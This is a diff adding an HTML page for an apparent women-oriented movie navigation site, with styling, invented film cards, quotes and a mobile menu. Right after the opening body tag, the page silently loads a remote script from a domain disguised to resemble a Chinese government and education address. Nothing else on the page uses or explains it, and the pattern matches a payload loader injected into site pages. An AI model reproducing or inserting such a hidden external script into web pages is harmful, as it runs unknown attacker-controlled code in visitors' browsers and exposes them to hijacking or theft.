@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>她影电影网 - 女性视角片单/情感剧/职场家庭片 | tatatadianyingwang-h5</title>
+<meta name="description" content="她影电影网（tatatadianyingwang-h5）是女性向影视导航：情感剧、职场剧、家庭剧、女性导演片单、闺蜜同看片单，樱粉奶油风，像翻一本女性影集。https://tatatadianyingwang-h5.github.io" />
+<meta name="keywords" content="她影电影网,tatatadianyingwang-h5,女性向电影,情感剧,职场剧,家庭剧,女性导演,闺蜜片单" />
+<link rel="canonical" href="https://tatatadianyingwang-h5.github.io/" />
+<meta property="og:title" content="她影电影网 - 女性视角影视导航" />
+<meta property="og:description" content="情感、职场、家庭、女性导演、闺蜜同看——像翻一本女性影集。" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://tatatadianyingwang-h5.github.io/" />
+<meta name="twitter:card" content="summary_large_image" />
+<style>
+:root{
+  --pink:#ff7eb3;
+  --pink2:#ffd0e4;
+  --rose:#ff5c8a;
+  --cream:#fff6f1;
+  --cream2:#ffeef5;
+  --ink:#3a2230;
+  --ink2:#7a5a68;
+  --line:#ffc6dd;
+  --mint:#bfe9d8;
+  --violet:#cdbcff;
+  --gold:#f4c95d;
+  --shadow:0 6px 0 #f3b9d2;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(1200px 500px at 80% -10%, #ffe3f0 0, transparent 60%),
+    radial-gradient(900px 400px at -10% 10%, #e9f8f1 0, transparent 55%),
+    linear-gradient(180deg,#fff6f1,#ffeef5 60%,#ffeede);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei",ui-sans-serif,system-ui,"Segoe UI",sans-serif;
+  line-height:1.7;font-size:16px;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+.serif{font-family:Georgia,"Times New Roman","Songti SC",serif}
+
+/* header */
+.topbar{position:sticky;top:0;z-index:50;background:rgba(255,246,241,.92);backdrop-filter:blur(10px);border-bottom:2px solid var(--line)}
+.top-in{display:flex;align-items:center;justify-content:space-between;height:62px;gap:12px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;color:var(--rose)}
+.logo .her{font-family:ui-monospace,monospace;background:linear-gradient(135deg,var(--pink),var(--rose));color:#fff;padding:4px 8px;border-radius:10px;box-shadow:0 3px 0 #e88aa8}
+.logo b{font-size:18px;letter-spacing:.5px}
+.logo small{font-size:11px;color:var(--ink2);font-family:ui-monospace,monospace}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:13px;padding:7px 13px;border-radius:999px;background:#fff;border:1px solid var(--line);color:var(--rose);font-weight:800}
+.nav a:hover{background:var(--rose);color:#fff;border-color:var(--rose)}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;border:1px solid var(--line);background:#fff;color:var(--rose);font-size:20px;cursor:pointer}
+
+/* hero */
+.hero{padding:46px 0 30px;position:relative;overflow:hidden}
+.hero .ribbon{position:absolute;inset:0;background:
+  radial-gradient(400px 200px at 90% 0,rgba(255,126,179,.18),transparent 70%),
+  radial-gradient(360px 200px at 0 30%,rgba(191,233,216,.25),transparent 70%);
+  pointer-events:none}
+.hero-grid{display:grid;grid-template-columns:1fr 360px;gap:34px;align-items:center;position:relative}
+.badge{display:inline-block;background:var(--rose);color:#fff;font-family:ui-monospace,monospace;font-size:11px;padding:4px 12px;border-radius:999px;letter-spacing:2px;box-shadow:0 3px 0 #d96f93}
+.hero h1{font-size:clamp(30px,5.5vw,52px);line-height:1.06;font-weight:900;margin:14px 0}
+.hero h1 em{font-style:normal;color:var(--rose)}
+.hero h1 .u{text-decoration:underline wavy var(--pink);text-underline-offset:6px}
+.hero p{color:var(--ink2);max-width:540px;margin-bottom:20px}
+.cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:12px 22px;border-radius:12px;font-weight:800;font-size:14px;border:0;cursor:pointer;background:linear-gradient(135deg,var(--pink),var(--rose));color:#fff;box-shadow:var(--shadow)}
+.btn:hover{filter:brightness(1.04)}
+.btn.ghost{background:#fff;color:var(--rose);border:2px solid var(--rose);box-shadow:none}
+.marquee{margin-top:26px;overflow:hidden;white-space:nowrap;border:1px dashed var(--rose);border-radius:10px;padding:9px 0;background:#fff}
+.marquee span{display:inline-block;padding:0 18px;font-size:12px;color:var(--ink2);font-family:ui-monospace,monospace}
+.marquee span::before{content:"🌸 ";}
+
+/* mood board */
+.mood{background:linear-gradient(135deg,#fff,#ffe9f3);border:2px solid var(--line);border-radius:18px;padding:22px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.mood .cap{font-family:ui-monospace,monospace;font-size:10px;letter-spacing:3px;color:var(--rose);margin-bottom:10px}
+.mood .big{font-family:Georgia,serif;font-size:26px;font-weight:900;color:var(--ink);line-height:1.2}
+.mood .big em{font-style:normal;color:var(--rose)}
+.mood .strip{display:flex;gap:8px;margin-top:14px}
+.mood .strip div{flex:1;aspect-ratio:1/1;border-radius:12px;display:grid;place-items:center;font-size:26px;border:1px solid var(--line)}
+.m1{background:linear-gradient(135deg,#ffd0e4,#ff7eb3)}
+.m2{background:linear-gradient(135deg,#d8f6ea,#bfe9d8)}
+.m3{background:linear-gradient(135deg,#e7dcff,#cdbcff)}
+.m4{background:linear-gradient(135deg,#fff0c2,#f4c95d)}
+
+/* section */
+.sec{padding:38px 0;border-bottom:1px dashed var(--line)}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:22px}
+.sec-head .tag{background:var(--rose);color:#fff;font-weight:900;padding:4px 12px;border-radius:8px;font-size:12px;letter-spacing:1px}
+.sec-head h2{font-size:22px;font-weight:900;color:var(--ink)}
+.sec-head a{margin-left:auto;font-size:13px;color:var(--rose);font-weight:800;border-bottom:1px dashed var(--rose)}
+
+/* film cards */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.card{background:#fff;border:2px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:var(--shadow);display:flex;flex-direction:column;transition:transform .14s}
+.card:hover{transform:translateY(-4px)}
+.card .cover{aspect-ratio:3/4;display:grid;place-items:center;font-size:52px;position:relative;border-bottom:2px solid var(--line)}
+.card .cover .pill{position:absolute;top:10px;left:10px;background:#fff;color:var(--rose);font-size:11px;font-weight:800;padding:3px 9px;border-radius:999px;border:1px solid var(--line)}
+.card .cover .heart{position:absolute;top:10px;right:10px;background:rgba(255,255,255,.9);border:1px solid var(--line);border-radius:999px;width:30px;height:30px;display:grid;place-items:center;font-size:14px;cursor:pointer}
+.card .body{padding:14px;display:flex;flex-direction:column;gap:8px}
+.card h3{font-size:16px;font-weight:850}
+.card .who{font-size:12px;color:var(--ink2)}
+.card .tags{display:flex;gap:6px;flex-wrap:wrap}
+.card .tags span{font-size:11px;padding:2px 8px;border-radius:999px;background:var(--cream2);color:var(--rose);border:1px solid var(--line)}
+.card .row{display:flex;align-items:center;justify-content:space-between;margin-top:2px}
+.card .rate{font-family:ui-monospace,monospace;font-weight:800;color:var(--rose)}
+.card .watch{background:var(--rose);color:#fff;font-size:12px;font-weight:800;padding:6px 12px;border-radius:10px}
+.c-a{background:linear-gradient(135deg,#ffe1ee,#ff9ec4)}
+.c-b{background:linear-gradient(135deg,#dff6ec,#a9e6cd)}
+.c-c{background:linear-gradient(135deg,#ece2ff,#c9b6ff)}
+.c-d{background:linear-gradient(135deg,#fff2cf,#f4cf72)}
+.c-e{background:linear-gradient(135deg,#ffe0d6,#ffb59a)}
+.c-f{background:linear-gradient(135deg,#e3f0ff,#a9c8ff)}
+
+/* voice rows */
+.voice{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.vcard{background:#fff;border:2px solid var(--line);border-radius:14px;padding:18px;display:grid;grid-template-columns:56px 1fr;gap:14px;align-items:start}
+.vcard .av{width:56px;height:56px;border-radius:14px;display:grid;place-items:center;font-size:28px;background:var(--cream2);border:1px solid var(--line)}
+.vcard h3{font-size:15px;font-weight:850;color:var(--ink)}
+.vcard p{font-size:13px;color:var(--ink2);margin-top:4px}
+.vcard .quote{margin-top:8px;font-family:Georgia,serif;font-style:italic;color:var(--rose);font-size:13px}
+
+/* director wall */
+.wall{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.tile{background:#fff;border:2px solid var(--line);border-radius:14px;padding:16px;text-align:center}
+.tile .em{font-size:30px}
+.tile h4{font-size:14px;font-weight:850;margin:8px 0 4px;color:var(--ink)}
+.tile p{font-size:11px;color:var(--ink2)}
+
+/* about */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:0;border:2px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:var(--shadow)}
+.about .l{padding:24px;background:#fff;border-right:2px solid var(--line)}
+.about .l h3{font-size:20px;font-weight:900;margin-bottom:10px;color:var(--rose)}
+.about .l p{color:var(--ink2);font-size:14px;margin-bottom:10px}
+.about .r{background:var(--cream2);padding:24px;font-size:13px;color:var(--ink2)}
+.about .r li{list-style:none;padding:8px 0;border-bottom:1px dashed var(--line)}
+.about .r li:before{content:"🌷 ";}
+
+/* footer */
+.foot{border-top:3px solid var(--rose);padding:30px 0;background:var(--cream2)}
+.fg{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:20px}
+.foot h4{font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--rose);margin-bottom:12px}
+.foot a{display:block;font-size:13px;color:var(--ink2);padding:4px 0}
+.foot a:hover{color:var(--rose)}
+.url{display:inline-block;margin-top:8px;font-family:ui-monospace,monospace;font-size:12px;border:1px dashed var(--rose);padding:6px 10px;border-radius:8px;color:var(--rose)}
+.copy{margin-top:20px;text-align:center;font-size:11px;color:var(--ink2);opacity:.7}
+
+.drawer{position:fixed;inset:0 0 0 auto;width:260px;background:#fff;border-left:3px solid var(--rose);z-index:60;padding:22px;transform:translateX(100%);transition:transform .28s;display:flex;flex-direction:column;gap:8px}
+.drawer.open{transform:none}
+.drawer a{padding:12px;border-radius:10px;background:var(--cream2);font-weight:800;color:var(--rose);border:1px solid var(--line)}
+.drawer .x{align-self:flex-end;background:none;border:0;font-size:24px;color:var(--rose);cursor:pointer}
+.mask{position:fixed;inset:0;background:rgba(58,34,48,.5);z-index:55;display:none}
+.mask.show{display:block}
+
+@media(max-width:1024px){
+  .hero-grid{grid-template-columns:1fr}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .wall{grid-template-columns:repeat(2,1fr)}
+  .about{grid-template-columns:1fr}
+  .about .l{border-right:none;border-bottom:2px solid var(--line)}
+  .fg{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .nav{display:none}
+  .menu-btn{display:block}
+  .grid{grid-template-columns:1fr}
+  .voice{grid-template-columns:1fr}
+  .fg{grid-template-columns:1fr}
+}
+@media(max-width:440px){
+  .wall{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap top-in">
+    <div class="logo"><span class="her">她她她</span><div><b>她影电影网</b><br><small>tatatadianyingwang-h5</small></div></div>
+    <nav class="nav" id="nav">
+      <a href="#feel">情感片单</a>
+      <a href="#voice">她者之声</a>
+      <a href="#director">女性创作者</a>
+      <a href="#bestie">闺蜜同看</a>
+      <a href="#about">关于她影</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero">
+    <div class="ribbon"></div>
+    <div class="hero-grid">
+      <div>
+        <span class="badge">HER FILM CLUB · 女性视角片单</span>
+        <h1>她影电影网：<br/>把电影当成<span class="u">她的日记</span></h1>
+        <p>她影电影网（tatatadianyingwang-h5）不做“男主拯救世界”的排片表，只收情感、职场、家庭、成长、女性导演、闺蜜同看——像翻一本女性影集，每一部都写着“你也经历过吧”。</p>
+        <div class="cta">
+          <a href="#feel" class="btn">翻情感片单</a>
+          <a href="#director" class="btn ghost">看女性创作者</a>
+        </div>
+        <div class="marquee">
+          <span>晚风邮差 治愈</span><span>五月来信 青春</span><span>长安灯市录 女性群像</span><span>山海钟鸣 国漫女性向</span><span>夜曲都市 音乐传记</span><span>剑穗与雨 武侠姐妹</span><span>猫町晚报 动画治愈</span>
+        </div>
+      </div>
+      <aside class="mood">
+        <div class="cap">TODAY'S MOOD BOARD</div>
+        <div class="big serif">“不是公主，<br/>是<em>自己提灯的人</em>。”</div>
+        <div class="strip">
+          <div class="m1">🌸</div><div class="m2">🍵</div><div class="m3">📖</div><div class="m4">🕯️</div>
+        </div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="sec" id="feel">
+    <div class="sec-head"><span class="tag">情感</span><h2>情感 / 职场 / 家庭 片单</h2><a href="#">全部女性向片单 #</a></div>
+    <div class="grid">
+      <article class="card"><div class="cover c-a">💌<span class="pill">青春·情感</span><span class="heart">♡</span></div><div class="body"><h3>五月来信</h3><div class="who">少女 / 未寄出的信 / 18 岁夏天</div><div class="tags"><span>青春</span><span>催泪</span><span>书信</span></div><div class="row"><span class="rate">8.6</span><a href="#" class="watch">加入片单</a></div></div></article>
+      <article class="card"><div class="cover c-b">👩‍💻<span class="pill">职场·成长</span><span class="heart">♡</span></div><div class="body"><h3>电梯里的第 12 层</h3><div class="who">新人 / 加班 / 第一次说不</div><div class="tags"><span>职场</span><span>女性成长</span><span>都市</span></div><div class="row"><span class="rate">8.4</span><a href="#" class="watch">加入片单</a></div></div></article>
+      <article class="card"><div class="cover c-c">🍲<span class="pill">家庭·代际</span><span class="heart">♡</span></div><div class="body"><h3>妈妈的电饭煲</h3><div class="who">母女 / 年夜饭 / 没说出口的抱歉</div><div class="tags"><span>家庭</span><span>温情</span><span>代际</span></div><div class="row"><span class="rate">8.8</span><a href="#" class="watch">加入片单</a></div></div></article>
+      <article class="card"><div class="cover c-d">🎤<span class="pill">音乐·传记</span><span class="heart">♡</span></div><div class="body"><h3>夜曲都市</h3><div class="who">驻唱女孩 / 凌晨两点的麦克风</div><div class="tags"><span>音乐</span><span>传记</span><span>追梦</span></div><div class="row"><span class="rate">8.5</span><a href="#" class="watch">加入片单</a></div></div></article>
+      <article class="card"><div class="cover c-e">🤝<span class="pill">友谊·羁绊</span><span class="heart">♡</span></div><div class="body"><h3>七月和剩下的我们</h3><div class="who">闺蜜决裂 / 十年后群聊亮起</div><div class="tags"><span>友情</span><span>成长</span><span>群像</span></div><div class="row"><span class="rate">8.7</span><a href="#" class="watch">加入片单</a></div></div></article>
+      <article class="card"><div class="cover c-f">🌙<span class="pill">独处·治愈</span><span class="heart">♡</span></div><div class="body"><h3>晚风邮差</h3><div class="who">一个人住 / 阳台 / 凌晨的信箱</div><div class="tags"><span>治愈</span><span>文艺</span><span>独处</span></div><div class="row"><span class="rate">8.7</span><a href="#" class="watch">加入片单</a></div></div></article>
+    </div>
+  </section>
+
+  <section class="sec" id="voice">
+    <div class="sec-head"><span class="tag">她者之声</span><h2>她们在片子里说过的话</h2><a href="#">更多台词 #</a></div>
+    <div class="voice">
+      <div class="vcard"><div class="av">📮</div><div><h3>《五月来信》</h3><p>十七岁以为喜欢是写信，后来才懂，敢把信寄出去才是长大。</p><div class="quote">“我没寄，但我不后悔写。”</div></div></div>
+      <div class="vcard"><div class="av">🪟</div><div><h3>《电梯里的第 12 层》</h3><p>不是所有上升都要微笑，有时候“我不干”也是一种晋升。</p><div class="quote">“把工位收拾好，比把情绪收拾好难。”</div></div></div>
+      <div class="vcard"><div class="av">🍚</div><div><h3>《妈妈的电饭煲》</h3><p>两代人的爱都焖在饭里，揭盖才知道是软是硬。</p><div class="quote">“她没说想你，只是多煮了一人份。”</div></div></div>
+      <div class="vcard"><div class="av">🎧</div><div><h3>《夜曲都市》</h3><p>舞台不属于谁，麦在手里的那三分钟，城市归你。</p><div class="quote">“唱给加班的、失恋的、还没睡的。”</div></div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="director">
+    <div class="sec-head"><span class="tag">创作者</span><h2>女性导演 / 编剧 角落</h2><a href="#">完整名单 #</a></div>
+    <div class="wall">
+      <div class="tile"><div class="em">🎬</div><h4>细腻派</h4><p>情绪特写 / 雨 / 饭桌 / 长镜头</p></div>
+      <div class="tile"><div class="em">✍️</div><h4>剧本派</h4><p>对白像刀 / 女性群像 / 家庭暗涌</p></div>
+      <div class="tile"><div class="em">🎨</div><h4>美术派</h4><p>裙摆颜色 / 房间光线 / 海报即诗</p></div>
+      <div class="tile"><div class="em">🎙️</div><h4>声音派</h4><p>环境音 / 独白 / 一首属于她的片尾曲</p></div>
+      <div class="tile"><div class="em">🏙️</div><h4>都市派</h4><p>租房 / 地铁 / 凌晨便利店</p></div>
+      <div class="tile"><div class="em">🏞️</div><h4>乡土派</h4><p>外婆的村 / 嫁妆 / 回不去的夏天</p></div>
+      <div class="tile"><div class="em">🧵</div><h4>代际派</h4><p>母亲与女儿 / 沉默的父系背景</p></div>
+      <div class="tile"><div class="em">🌱</div><h4>青春派</h4><p>校服 / 传纸条 / 第一次心动与散场</p></div>
+    </div>
+  </section>
+
+  <section class="sec" id="bestie">
+    <div class="sec-head"><span class="tag">闺蜜同看</span><h2>两个人一起看不冷场</h2><a href="#">更多组合 #</a></div>
+    <div class="voice">
+      <div class="vcard"><div class="av">🍷</div><div><h3>失恋重启夜</h3><p>《五月来信》+《夜曲都市》+ 一瓶起泡酒，哭完再骂完。</p><div class="quote">适合：刚删掉那个人微信的周末</div></div></div>
+      <div class="vcard"><div class="av">🧦</div><div><h3>妈系视频通话</h3><p>《妈妈的电饭煲》+《七月和剩下的我们》，边看边给家里发语音。</p><div class="quote">适合：异地、想家、不敢打电话时</div></div></div>
+      <div class="vcard"><div class="av">📚</div><div><h3>文艺拖延夜</h3><p>《晚风邮差》+ 一杯热可可 + 一句“明天再卷”。</p><div class="quote">适合：论文写不动 / 周日晚焦虑</div></div></div>
+      <div class="vcard"><div class="av">🌧️</div><div><h3>雨天闺蜜局</h3><p>《山海钟鸣》+《长安灯市录》，聊女性群像为什么比男主救世好看。</p><div class="quote">适合：下雨、外卖、不出门</div></div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="about">
+    <div class="sec-head"><span class="tag">i</span><h2>关于她影电影网</h2></div>
+    <div class="about">
+      <div class="l">
+        <h3>不是“给女生看的甜宠”，是“她自己选的片单”</h3>
+        <p>她影电影网（tatatadianyingwang-h5）是女性向影视导航演示站：情感、职场、家庭、成长、女性导演、闺蜜同看。排片逻辑不是“谁帅谁上位”，而是“哪部让她说得出话”。</p>
+        <p>单文件 index.html、CSS/JS 内联、移动端自适应，适合 GitHub Pages 托管，也适合做女性向片单站、影评书签站、独立电影入口站。</p>
+        <p>不提供盗版资源下载与在线盗播；片名、评分、类型仅作分类导航与检索用途。</p>
+      </div>
+      <ul class="r">
+        <li>樱粉+奶油+丝带曲线</li>
+        <li>女性视角，不卖擦边</li>
+        <li>情感/职场/家庭/成长齐全</li>
+        <li>女性导演与编剧单独成墙</li>
+        <li>闺蜜同看组合推荐</li>
+        <li>必应友好：标题/描述/canonical 齐</li>
+      </ul>
+    </div>
+  </section>
+
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <h4>她影电影网</h4>
+        <p style="font-size:13px;color:var(--ink2)">女性向影视导航：情感、职场、家庭、成长、女性创作者、闺蜜同看。</p>
+        <span class="url">https://tatatadianyingwang-h5.github.io</span>
+      </div>
+      <div><h4>片单</h4><a href="#feel">情感片单 #</a><a href="#voice">她者之声 #</a><a href="#director">女性创作者 #</a><a href="#bestie">闺蜜同看 #</a></div>
+      <div><h4>类型</h4><a href="#">青春书信 #</a><a href="#">都市职场 #</a><a href="#">家庭代际 #</a><a href="#">独处治愈 #</a></div>
+      <div><h4>站点</h4><a href="#feel">情感片单 #</a><a href="#director">女性创作者 #</a><a href="#bestie">闺蜜同看 #</a><a href="#about">关于她影 #</a></div>
+    </div>
+    <div class="copy">© 2026 她影电影网 tatatadianyingwang-h5 · 女性向影视导航演示，不提供盗版资源下载与在线盗播。“她她她”仅作品牌叠词，无低俗含义。</div>
+  </div>
+</footer>
+
+<div class="mask" id="mask"></div>
+<aside class="drawer" id="drawer">
+  <button class="x" id="drawerClose">×</button>
+  <a href="#feel">情感片单</a>
+  <a href="#voice">她者之声</a>
+  <a href="#director">女性创作者</a>
+  <a href="#bestie">闺蜜同看</a>
+  <a href="#about">关于她影</a>
+</aside>
+
+<script>
+  var menuBtn=document.getElementById('menuBtn');
+  var drawer=document.getElementById('drawer');
+  var mask=document.getElementById('mask');
+  var close=document.getElementById('drawerClose');
+  menuBtn.addEventListener('click',function(){drawer.classList.add('open');mask.classList.add('show')});
+  close.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  mask.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  drawer.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')})});
+  document.querySelectorAll('.heart').forEach(function(h){h.addEventListener('click',function(){h.textContent=h.textContent==='♡'?'♥':'♡';h.style.color=h.textContent==='♥'?'#ff5c8a':''})});
+</script>
+</body>
+</html>
